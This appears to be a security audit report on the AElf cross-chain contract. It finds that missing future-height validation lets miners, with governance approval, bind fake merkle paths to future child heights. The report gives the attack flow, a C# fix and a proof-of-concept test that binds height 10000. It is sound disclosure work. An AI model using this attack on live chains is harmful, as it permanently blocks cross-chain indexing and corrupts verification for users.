# Audit Report

## Title
Missing Future Height Validation in Cross-Chain Parent Height Binding Allows Permanent DoS of Cross-Chain Indexing

## Summary
The cross-chain indexing validation logic fails to verify that child chain heights in `IndexedMerklePath` are at or below the current block height. This allows future heights to be pre-bound with arbitrary merkle paths, permanently blocking legitimate cross-chain indexing when those heights are reached.

## Finding Description

The vulnerability exists in the cross-chain indexing flow where parent chain block data is proposed and indexed on the side chain. The `BindParentChainHeight()` function only checks if a binding already exists but never validates that the child height is not in the future. [1](#0-0) 

The validation function `ValidateParentChainBlockData()` checks if heights in `IndexedMerklePath` are already bound but does not validate that these heights represent actual existing blocks on the child chain (i.e., that they are â‰¤ `Context.CurrentHeight`). [2](#0-1) 

When `IndexParentChainBlockData()` processes the data, it iterates through `IndexedMerklePath` and calls `BindParentChainHeight()` for each height without any future height validation. [3](#0-2) 

**Attack Flow:**
1. A miner calls `ProposeCrossChainIndexing()` with `ParentChainBlockData` containing future heights (e.g., height 10000 when current height is 100) in `IndexedMerklePath` [4](#0-3) 

2. The validation passes because it only checks if heights are already bound, not if they're in the future
3. A proposal is created and governance (CrossChainIndexingController) approves it
4. The miner calls `ReleaseCrossChainIndexingProposal()` which triggers `RecordCrossChainData()` [5](#0-4) [6](#0-5) 

5. The future heights are successfully bound with fake merkle paths
6. When the chain reaches those heights, legitimate cross-chain data fails validation because the heights are already bound

This is a **mis-scoped privilege issue** - the contract should automatically validate that heights are not in the future using `Context.CurrentHeight`, rather than implicitly relying on governance to detect this. Governance is expected to verify parent chain data authenticity, not to check for temporal inconsistencies that the contract can validate itself.

## Impact Explanation

**HIGH Severity - Permanent Cross-Chain Infrastructure Corruption:**

1. **Permanent DoS of Legitimate Indexing**: When the child chain reaches a pre-bound future height, any legitimate parent chain block data containing that height will fail validation because the check in `ValidateParentChainBlockData()` returns false when it finds the height already bound. This permanently blocks cross-chain indexing for those heights with no recovery mechanism.

2. **Cross-Chain Verification Corruption**: The fake merkle path stored at the future height corrupts the cross-chain verification system. When `GetBoundParentChainHeightAndMerklePathByHeight()` is called for that height, it returns the malicious binding. [7](#0-6) 

This affects all cross-chain transaction verifications relying on that height data.

3. **No Unbinding Mechanism**: The `BindParentChainHeight()` function strictly asserts that heights cannot be rebound once set, making the corruption irreversible without state migration.

The impact is severe because it permanently corrupts critical cross-chain infrastructure, blocks legitimate operations indefinitely, and compromises the integrity of cross-chain transaction verification.

## Likelihood Explanation

**MEDIUM Likelihood - Mis-Scoped Validation Responsibility:**

While the attack requires both miner permission and governance approval, this is fundamentally a **contract design flaw** rather than a pure governance compromise scenario:

1. **Contract-Level Validation Missing**: The contract has access to `Context.CurrentHeight` and should automatically reject future heights as invalid input. This is a simple bounds check that should not require governance review.

2. **Governance Scope Confusion**: The CrossChainIndexingController is expected to verify that the parent chain data is authentic (matches actual parent chain blocks), not to validate temporal consistency against the current child chain state. Governance could reasonably assume the contract already validates this basic invariant.

3. **Social Engineering Vulnerability**: Even honest governance could be tricked if the proposal is presented as legitimate parent chain data, especially if they lack visibility into which child heights are being bound.

4. **Detection Difficulty**: The malicious bindings are not easily detectable until the chain reaches those heights and legitimate indexing fails, at which point recovery is extremely difficult.

This represents a mis-scoped privilege where validation logic that should be automatic in the contract is implicitly delegated to governance, creating an exploitable gap.

## Recommendation

Add future height validation in `ValidateParentChainBlockData()` to check that all heights in `IndexedMerklePath` are at or below `Context.CurrentHeight`:

```csharp
private bool ValidateParentChainBlockData(IList<ParentChainBlockData> parentChainBlockData,
    out Dictionary<int, List<ParentChainBlockData>> validatedParentChainBlockData)
{
    var parentChainId = State.ParentChainId.Value;
    var currentHeight = State.CurrentParentChainHeight.Value;
    validatedParentChainBlockData = new Dictionary<int, List<ParentChainBlockData>>();
    foreach (var blockData in parentChainBlockData)
    {
        if (parentChainId != blockData.ChainId || currentHeight + 1 != blockData.Height ||
            blockData.TransactionStatusMerkleTreeRoot == null)
            return false;
        
        // ADD THIS CHECK: Validate that indexed heights are not in the future
        if (blockData.IndexedMerklePath.Any(indexedBlockInfo => 
                indexedBlockInfo.Key > Context.CurrentHeight))
            return false;
            
        if (blockData.IndexedMerklePath.Any(indexedBlockInfo =>
                State.ChildHeightToParentChainHeight[indexedBlockInfo.Key] != 0 ||
                State.TxRootMerklePathInParentChain[indexedBlockInfo.Key] != null))
            return false;

        currentHeight += 1;
    }

    if (parentChainBlockData.Count > 0)
        validatedParentChainBlockData[parentChainId] = parentChainBlockData.ToList();

    return true;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task Test_FutureHeightBinding_Vulnerability()
{
    var parentChainId = 123;
    long parentChainHeightOfCreation = 10;
    await InitAndCreateSideChainAsync(parentChainHeightOfCreation, parentChainId);

    // Current height is around 10-15
    var currentHeight = BlockTimeProvider.GetBlockTime().Seconds;
    
    // Create parent chain block data with FUTURE height in IndexedMerklePath
    var futureHeight = 10000; // Far in the future
    var fakeTransactionStatusMerkleRoot = HashHelper.ComputeFrom("TransactionStatusMerkleRoot");
    var fakeMerklePath = new MerklePath();
    fakeMerklePath.MerklePathNodes.Add(new MerklePathNode { Hash = HashHelper.ComputeFrom("fake"), IsLeftChildNode = true });
    
    var parentChainBlockData = new ParentChainBlockData
    {
        ChainId = parentChainId,
        Height = parentChainHeightOfCreation,
        TransactionStatusMerkleTreeRoot = fakeTransactionStatusMerkleRoot,
        IndexedMerklePath = { { futureHeight, fakeMerklePath } } // Future height!
    };
    
    var crossChainBlockData = new CrossChainBlockData
    {
        ParentChainBlockDataList = { parentChainBlockData }
    };

    // Propose the malicious data
    var txRes = await CrossChainContractStub.ProposeCrossChainIndexing.SendAsync(crossChainBlockData);
    txRes.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // PASSES validation!
    
    var proposalId = ProposalCreated.Parser
        .ParseFrom(txRes.TransactionResult.Logs.First(l => l.Name.Contains(nameof(ProposalCreated))).NonIndexed)
        .ProposalId;
    
    // Approve with governance
    await ApproveWithMinersAsync(proposalId);
    
    // Release the proposal - this binds the future height
    var releaseResult = await CrossChainContractStub.ReleaseCrossChainIndexingProposal.SendAsync(
        new ReleaseCrossChainIndexingProposalInput { ChainIdList = { parentChainId } });
    releaseResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify the future height is now bound
    var boundData = await CrossChainContractStub.GetBoundParentChainHeightAndMerklePathByHeight.CallAsync(
        new Int64Value { Value = futureHeight });
    boundData.BoundParentChainHeight.ShouldBe(parentChainHeightOfCreation); // Future height is bound!
    
    // When legitimate data comes for this height later, it will fail validation
    // because the height is already bound, causing permanent DoS
}
```

### Citations

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L27-32)
```csharp
    private void BindParentChainHeight(long childHeight, long parentHeight)
    {
        Assert(State.ChildHeightToParentChainHeight[childHeight] == 0,
            $"Already bound at height {childHeight} with parent chain");
        State.ChildHeightToParentChainHeight[childHeight] = parentHeight;
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L309-336)
```csharp
    private void RecordCrossChainData(IEnumerable<int> chainIdList)
    {
        var indexedSideChainBlockData = new IndexedSideChainBlockData();
        foreach (var chainId in chainIdList)
        {
            var pendingProposalExists = TryGetIndexingProposalWithStatus(chainId,
                CrossChainIndexingProposalStatus.Pending,
                out var pendingCrossChainIndexingProposal);
            Assert(pendingProposalExists, "Chain indexing not proposed.");

            if (chainId == State.ParentChainId.Value)
                IndexParentChainBlockData(pendingCrossChainIndexingProposal.ProposedCrossChainBlockData
                    .ParentChainBlockDataList);
            else
                indexedSideChainBlockData.SideChainBlockDataList.Add(IndexSideChainBlockData(
                    pendingCrossChainIndexingProposal.ProposedCrossChainBlockData.SideChainBlockDataList,
                    pendingCrossChainIndexingProposal.Proposer, chainId));

            SetCrossChainIndexingProposalStatus(pendingCrossChainIndexingProposal,
                CrossChainIndexingProposalStatus.Accepted);
        }

        if (indexedSideChainBlockData.SideChainBlockDataList.Count > 0)
        {
            State.IndexedSideChainBlockData.Set(Context.CurrentHeight, indexedSideChainBlockData);
            Context.Fire(new SideChainBlockDataIndexed());
        }
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L720-743)
```csharp
    private bool ValidateParentChainBlockData(IList<ParentChainBlockData> parentChainBlockData,
        out Dictionary<int, List<ParentChainBlockData>> validatedParentChainBlockData)
    {
        var parentChainId = State.ParentChainId.Value;
        var currentHeight = State.CurrentParentChainHeight.Value;
        validatedParentChainBlockData = new Dictionary<int, List<ParentChainBlockData>>();
        foreach (var blockData in parentChainBlockData)
        {
            if (parentChainId != blockData.ChainId || currentHeight + 1 != blockData.Height ||
                blockData.TransactionStatusMerkleTreeRoot == null)
                return false;
            if (blockData.IndexedMerklePath.Any(indexedBlockInfo =>
                    State.ChildHeightToParentChainHeight[indexedBlockInfo.Key] != 0 ||
                    State.TxRootMerklePathInParentChain[indexedBlockInfo.Key] != null))
                return false;

            currentHeight += 1;
        }

        if (parentChainBlockData.Count > 0)
            validatedParentChainBlockData[parentChainId] = parentChainBlockData.ToList();

        return true;
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L761-807)
```csharp
    private IndexedParentChainBlockData IndexParentChainBlockData(IList<ParentChainBlockData> parentChainBlockData)
    {
        var parentChainId = State.ParentChainId.Value;
        var currentHeight = State.CurrentParentChainHeight.Value;
        var indexedParentChainBlockData = new IndexedParentChainBlockData
        {
            LocalChainHeight = Context.CurrentHeight
        };
        for (var i = 0; i < parentChainBlockData.Count; i++)
        {
            var blockInfo = parentChainBlockData[i];
            AssertParentChainBlock(parentChainId, currentHeight, blockInfo);
            var parentChainHeight = blockInfo.Height;
            State.ParentChainTransactionStatusMerkleTreeRoot[parentChainHeight] =
                blockInfo.TransactionStatusMerkleTreeRoot;
            foreach (var indexedBlockInfo in blockInfo.IndexedMerklePath)
            {
                BindParentChainHeight(indexedBlockInfo.Key, parentChainHeight);
                AddIndexedTxRootMerklePathInParentChain(indexedBlockInfo.Key, indexedBlockInfo.Value);
            }

            // send consensus data shared from main chain  
            if (i == parentChainBlockData.Count - 1 &&
                blockInfo.ExtraData.TryGetValue(ConsensusExtraDataName, out var bytes))
            {
                Context.LogDebug(() => "Updating consensus information..");
                UpdateConsensusInformation(bytes);
            }

            if (blockInfo.CrossChainExtraData != null)
                State.TransactionMerkleTreeRootRecordedInParentChain[parentChainHeight] =
                    blockInfo.CrossChainExtraData.TransactionStatusMerkleTreeRoot;

            indexedParentChainBlockData.ParentChainBlockDataList.Add(blockInfo);
            currentHeight += 1;
        }

        State.CurrentParentChainHeight.Value = currentHeight;
        
        Context.Fire(new ParentChainIndexed
        {
            ChainId = parentChainId,
            IndexedHeight = currentHeight
        });

        return indexedParentChainBlockData;
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract.cs (L282-291)
```csharp
    public override Empty ProposeCrossChainIndexing(CrossChainBlockData input)
    {
        Context.LogDebug(() => "Proposing cross chain data..");
        EnsureTransactionOnlyExecutedOnceInOneBlock();
        AssertAddressIsCurrentMiner(Context.Sender);
        ClearCrossChainIndexingProposalIfExpired();
        var crossChainDataDto = ValidateCrossChainDataBeforeIndexing(input);
        ProposeCrossChainBlockData(crossChainDataDto, Context.Sender);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract.cs (L293-302)
```csharp
    public override Empty ReleaseCrossChainIndexingProposal(ReleaseCrossChainIndexingProposalInput input)
    {
        Context.LogDebug(() => "Releasing cross chain data..");
        EnsureTransactionOnlyExecutedOnceInOneBlock();
        AssertAddressIsCurrentMiner(Context.Sender);
        Assert(input.ChainIdList.Count > 0, "Empty input not allowed.");
        ReleaseIndexingProposal(input.ChainIdList);
        RecordCrossChainData(input.ChainIdList);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_View.cs (L19-30)
```csharp
    public override CrossChainMerkleProofContext GetBoundParentChainHeightAndMerklePathByHeight(Int64Value input)
    {
        var boundParentChainHeight = State.ChildHeightToParentChainHeight[input.Value];
        Assert(boundParentChainHeight != 0);
        var merklePath = State.TxRootMerklePathInParentChain[input.Value];
        Assert(merklePath != null);
        return new CrossChainMerkleProofContext
        {
            MerklePathFromParentChain = merklePath,
            BoundParentChainHeight = boundParentChainHeight
        };
    }
```
